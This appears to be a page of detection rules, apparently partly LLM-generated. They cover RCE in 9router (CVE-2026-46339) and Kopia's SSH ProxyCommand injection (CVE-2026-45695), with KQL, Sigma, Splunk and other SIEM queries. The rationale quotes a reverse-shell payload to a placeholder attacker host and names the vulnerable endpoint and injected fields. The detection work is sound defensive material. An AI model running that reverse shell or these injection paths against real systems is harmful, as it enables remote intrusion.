Detects HTTP POST to the unauthenticated 9router cowork-settings endpoint with a customPlugins array containing an executable command field — the registration step of CVE-2026-46339 RCE before the SSE-triggered spawn(). Default Docker exposure is 0.0.0.0:20128. Rationale: The article names the exact vulnerable POST endpoint /api/cli-tools/cowork-settings (src/app/api/cli-tools/cowork-settings/route.js lines 292-319) and the Docker default port 20128. Any external unauthenticated POST to this path is exploitation by definition since the route is unguarded by middleware (src/proxy.js matcher) and the customPlugins.command/args fields are stored verbatim into globalThis.__9routerCustomPlugins. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj

[LLM] 9router Node.js process spawning shell binary (CVE-2026-46339 post-exploit) Installation High
Detects /bin/sh, /bin/bash or other shells spawned with node (server.js / next-server) as the parent process — direct host-side evidence of CVE-2026-46339 plugin-bridge RCE where attacker-controlled command/args reach Node's spawn() via the MCP stdio→SSE bridge. Rationale: The article describes the exact code path src/lib/mcp/stdioSseBridge.js line 138 calling spawn(plugin.command, plugin.args) with attacker-controlled values. The PoC payloads use /bin/sh -c and /bin/bash -i directly, so a node→shell parent-child pair on a 9router host is high-fidelity exploitation evidence — Node.js apps in production rarely shell out to /bin/sh directly. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj

[LLM] Reverse shell from 9router-spawned shell — outbound TCP from node-child bash Command & Control Medium
Detects outbound network connections originating from /bin/bash or /bin/sh processes whose parent is node — the typical reverse-shell post-exploitation pattern of CVE-2026-46339, including the PoC payload `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`. Rationale: The article's PoC explicitly shows `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` as the reverse-shell payload registered via customPlugins.args. Detecting node→bash→outbound-TCP at the EDR layer catches the actual exploitation impact even when web-tier logs are unavailable (reverse-proxy not in scope or container egress). Sentinel KQL omitted: ImNetworkSession lacks initiating-process correlation fields and Linux Syslog/auditd entries reach Sentinel without the structured parent-process linkage needed for high fidelity. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj

Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Kopia process spawns ssh with -oProxyCommand= argument (CVE-2026-45695)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] SSH process spawned by Kopia invokes a shell child (ProxyCommand execution)
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] Kopia process spawns ssh with -oProxyCommand= argument (CVE-2026-45695) Exploitation High
Detects exploitation of Kopia's unauthenticated SFTP/externalSSH path injection. When the vulnerable /api/v1/repo/exists handler invokes blob.NewStorage with attacker-supplied sshArguments, the kopia process directly forks ssh with a -oProxyCommand= token that OpenSSH then executes via $SHELL -c. The kopia→ssh parent/child with ProxyCommand in the child argv is a near-zero-FP signature of this RCE. Rationale: Uses the exact narrow signature described in the advisory: kopia process (vulnerable handler) directly invoking exec.CommandContext("ssh", ...) with a ProxyCommand token. The string 'ProxyCommand' in an ssh argv whose parent is kopia has effectively no benign use case outside intentional SFTP jump-host setups. Cross-checked against the GHSA advisory, the Kopia v0.22.3 source references in the article, and the fix PR #5354. Cross-checked against: • https://github.com/kopia/kopia/pull/5354 • https://github.com/kopia/kopia/blob/v0.22.3/repo/blob/sftp/sftp_storage.go • https://nvd.nist.gov/vuln/detail/CVE-2026-45695
ATT&CKT1190 T1059.004 T1059.003

DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
| where FileName in~ ("ssh","ssh.exe")
| where ProcessCommandLine has "ProxyCommand"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FolderPath, ProcessCommandLine, ProcessId, InitiatingProcessId, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
| where ActingProcessName has_any ("ssh","ssh.exe")
| where ActingProcessCommandLine has "ProxyCommand"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, ActingProcessId
| order by TimeGenerated desc

logsource:
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith:
      - '/kopia'
      - '\kopia.exe'
      - '/kopia-ui'
      - '\kopia-ui.exe'
  selection_child:
    Image|endswith:
      - '/ssh'
      - '\ssh.exe'
  selection_arg:
    CommandLine|contains: 'ProxyCommand'
  condition: all of selection_*
falsepositives:
  - Legitimate Kopia SFTP repository configurations that intentionally use ProxyCommand to traverse a jump host (rare; should be tightly controlled).
level: critical
(source:linux.auditd OR source:windows.sysmon) @ParentImage:(*/kopia OR *\\kopia.exe OR *\\Kopia.exe OR */kopia-ui OR *\\kopia-ui.exe) @Image:(*/ssh OR *\\ssh.exe OR *\\SSH.EXE) @CommandLine:(*ProxyCommand* OR *proxycommand*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^kopia(-ui)?(\.exe)?$/i ImageFileName=/[\\\/]ssh(\.exe)?$/i
| regex("(?i)proxycommand", field=CommandLine)
| groupBy([aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("kopia","kopia.exe","kopia-ui","kopia-ui.exe") AND Processes.process_name IN ("ssh","ssh.exe") AND (Processes.process="*ProxyCommand*" OR Processes.process="*-oProxyCommand*" OR Processes.process="*-o ProxyCommand*") by host Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process Processes.process_path | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("kopia","kopia.exe","kopia-ui","kopia-ui.exe") AND Processes.process_name IN ("ssh","ssh.exe") AND (Processes.process="*ProxyCommand*" OR Processes.process="*-oProxyCommand*" OR Processes.process="*-o ProxyCommand*") by host Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process Processes.process_path | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
[LLM] SSH process spawned by Kopia invokes a shell child (ProxyCommand execution) Installation High
Detects the second-stage execution arm of CVE-2026-45695: OpenSSH evaluates -oProxyCommand=<cmd> by invoking $SHELL -c <cmd> before any TCP connect. The resulting kopia → ssh → (sh|bash|cmd|powershell) grand-parent/parent/child chain is the artifact of arbitrary code running as the kopia service account. Rationale: This is the exact execution chain the advisory describes — OpenSSH spawns $SHELL -c <attacker_cmd> before attempting TCP, so the shell child of ssh is the observable smoking gun. Pairing it with a kopia grand-parent (via SshPid join) removes essentially all benign ssh ProxyCommand use. Confirmed against the GHSA advisory text and OpenSSH ProxyCommand documented behaviour. Cross-checked against: • https://github.com/advisories/GHSA-2q4c-3mrw-63c3 • https://man.openbsd.org/ssh_config.5#ProxyCommand • https://github.com/kopia/kopia/pull/5354
ATT&CKT1059.004 T1059.001 T1059.003 T1203
Data sourcesEndpoint.Processes
let kopia_ssh =
    DeviceProcessEvents
    | where Timestamp > ago(7d)
    | where InitiatingProcessFileName in~ ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
    | where FileName in~ ("ssh","ssh.exe")
    | project SshTime = Timestamp, DeviceId, SshPid = ProcessId, SshCmd = ProcessCommandLine, KopiaCmd = InitiatingProcessCommandLine;
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("ssh","ssh.exe")
| where FileName in~ ("sh","bash","dash","zsh","ksh","cmd.exe","powershell.exe","pwsh.exe","pwsh")
| join kind=inner kopia_ssh on $left.DeviceId == $right.DeviceId and $left.InitiatingProcessId == $right.SshPid
| where Timestamp between (SshTime .. SshTime + 30s)
| project Timestamp, DeviceName, AccountName, KopiaCmd, SshCmd, ShellImage = FolderPath, ShellCmd = ProcessCommandLine, SshPid
| order by Timestamp desc
let kopia_ssh =
    ImProcessCreate
    | where TimeGenerated > ago(7d)
    | where ParentProcessName has_any ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
    | where ActingProcessName has_any ("ssh","ssh.exe")
    | project SshTime = TimeGenerated, DvcHostname, SshPid = ActingProcessId, SshCmd = ActingProcessCommandLine, KopiaCmd = ParentProcessCommandLine;
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("ssh","ssh.exe")
| where ActingProcessName has_any ("sh","bash","dash","zsh","ksh","cmd.exe","powershell.exe","pwsh.exe","pwsh")
| join kind=inner kopia_ssh on $left.DvcHostname == $right.DvcHostname and $left.ParentProcessId == $right.SshPid
| where TimeGenerated between (SshTime .. SshTime + 30s)
| project TimeGenerated, DvcHostname, ActorUsername, KopiaCmd, SshCmd, ShellName = ActingProcessName, ShellCmd = ActingProcessCommandLine
| order by TimeGenerated desc
(source:linux.auditd OR source:windows.sysmon) @ParentImage:(*/ssh OR *\\ssh.exe OR *\\SSH.EXE) @Image:(*/sh OR */bash OR */dash OR */zsh OR */ksh OR *\\cmd.exe OR *\\CMD.EXE OR *\\powershell.exe OR *\\PowerShell.exe OR *\\pwsh.exe) @CommandLine:(*-c*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^ssh(\.exe)?$/i ImageFileName=/[\\\/](sh|bash|dash|zsh|ksh|cmd\.exe|powershell\.exe|pwsh(\.exe)?)$/i
| join({
    #event_simpleName=ProcessRollup2 ParentBaseFileName=/^kopia(-ui)?(\.exe)?$/i ImageFileName=/[\\\/]ssh(\.exe)?$/i
    | rename(TargetProcessId, as=SshParentPid)
    | select([aid, SshParentPid])
  }, field=[aid, ParentProcessId], key=[aid, SshParentPid], include=[SshParentPid])
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine], function=count())

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-45695")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-45695")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-45695")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-45695")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
